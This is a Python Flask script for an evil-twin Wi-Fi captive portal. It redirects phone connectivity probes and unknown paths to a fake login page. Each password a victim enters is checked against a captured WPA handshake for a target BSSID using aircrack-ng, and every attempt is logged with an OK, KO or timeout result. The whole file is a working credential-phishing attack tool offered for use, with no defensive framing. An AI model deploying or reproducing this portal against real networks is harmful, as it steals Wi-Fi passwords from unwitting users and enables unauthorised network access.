import subprocess
import sys

from flask import Flask, redirect, render_template, request, url_for

app = Flask(__name__)
is_debug = len(sys.argv) != 3
bssid = str(sys.argv[1])

wordlist_file = open("wordlist.txt", "w")
results_file = open("results.txt", "a")


# android: generate_204 gen_204
# ios: /hotspot-detect.html
@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for("index"))


@app.route("/check-password", methods=["POST"])
def check_password():
    data = request.get_json()
    entered_password = data.get("password")

    wordlist_file.seek(0)
    wordlist_file.truncate()
    wordlist_file.write(entered_password + "\n")
    wordlist_file.flush()

    try:
        result = subprocess.run(
            [
                "aircrack-ng",
                "-w",
                "wordlist.txt",
                "-b",
                bssid,
                "handshake.cap",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=10,
        )
        output = result.stdout.decode()
        print(output)
        result = "OK" if "KEY FOUND!" in output else "KO"
        results_file.write(f"{result}: {entered_password}\n")
        results_file.flush()
        return result
    except subprocess.TimeoutExpired:
        results_file.write(f"TI: {entered_password}\n")
        results_file.flush()
        return "KO"


@app.route("/", methods=["GET", "POST"])
def index():
    return render_template("index.html")


def cleanup():
    wordlist_file.close()
    results_file.close()


if __name__ == "__main__":
    try:
        app.run(
            debug=is_debug,
            host="127.0.0.1" if is_debug else str(sys.argv[2]),
            port=5000 if is_debug else 80,
        )
    finally:
        cleanup()
